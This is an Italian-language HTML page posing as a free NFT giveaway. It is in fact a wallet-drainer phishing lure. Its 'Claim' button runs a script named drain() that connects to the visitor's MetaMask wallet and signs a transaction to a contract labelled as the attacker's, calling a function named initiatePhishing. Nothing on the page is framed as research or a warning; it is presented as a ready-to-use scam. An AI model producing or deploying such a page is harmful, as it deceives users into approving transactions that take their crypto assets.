<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Claim Your NFT</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(145deg, #f0f0f0, #d6d6d6);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
    }

    .card {
      background-color: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0px 10px 20px rgba(0,0,0,0.15);
      text-align: center;
      max-width: 400px;
    }

    .card h2 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    .btn {
      padding: 12px 24px;
      font-size: 16px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>üéÅ Richiedi il tuo NFT gratuito</h2>
    <button class="btn" onclick="drain()">Claim</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
  <script>
    async function drain() {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

      const attackerContractAddress = "0xfC9D196Dd09E578cFb44321c8e2792735301A5F1";
      const victimContractAddress = "0x9C74EE191F0178088b6c97376b62108B038495A5";

      const contract = new window.web3.eth.Contract([
        {
          "inputs": [
            { "internalType": "address", "name": "_victimContract", "type": "address" }
          ],
          "name": "initiatePhishing",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ], attackerContractAddress);

      await contract.methods.initiatePhishing(victimContractAddress).send({ from: accounts[0] });
    }

    window.addEventListener('load', () => {
      if (typeof window.ethereum !== 'undefined') {
        window.web3 = new Web3(window.ethereum);
      } else {
        alert("‚ö†Ô∏è Installa Metamask per richiedere il tuo NFT!");
      }
    });
  </script>
</body>
</html>
